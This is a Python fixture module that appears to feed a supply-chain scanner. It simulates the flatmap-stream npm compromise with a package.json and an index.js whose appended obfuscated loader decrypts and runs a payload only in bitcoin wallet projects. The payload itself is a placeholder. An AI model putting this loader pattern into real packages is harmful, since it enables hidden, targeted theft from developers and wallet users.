"""
Simulated event-stream/flatmap-stream (npm maintainer takeover) attack patterns.
Real attack: social-engineered maintainer access, injected targeted cryptocurrency theft.
"""

PACKAGE_JSON = """{
  "name": "flatmap-stream",
  "version": "0.1.1",
  "description": "A mapping and flat-mapping for streams"
}"""

# The real attack used AES-encrypted payload that only decrypted on the target's machine
INDEX_JS = """
var Stream = require('stream').Transform;

module.exports = function(e) {
  var s = new Stream({objectMode: true});
  s._transform = function(d, _, cb) { cb(null, d); };
  return s;
};

// Injected malicious code (obfuscated in real attack)
!function() {
  try {
    var r = require, t = process;
    function e(r) {
      return Buffer.from(r, "hex").toString()
    }
    var n = r(e("63727970746f")),  // "crypto"
        o = r(e("68747470")),       // "http"
        a = t.env,
        c = a.npm_package_description;

    // Only triggers for specific target (copay bitcoin wallet)
    if (c && c.includes("bitcoin")) {
      var i = n.createDecipher("aes256", c);
      var payload = "encrypted_wallet_theft_code_here";
      var decoded = Buffer.concat([i.update(payload, "hex"), i.final()]);
      new Function(decoded.toString())();
    }
  } catch(e) {}
}();
"""

PACKAGE_FILES = {
    "flatmap-stream-0.1.1/package.json": PACKAGE_JSON,
    "flatmap-stream-0.1.1/index.js": INDEX_JS,
}
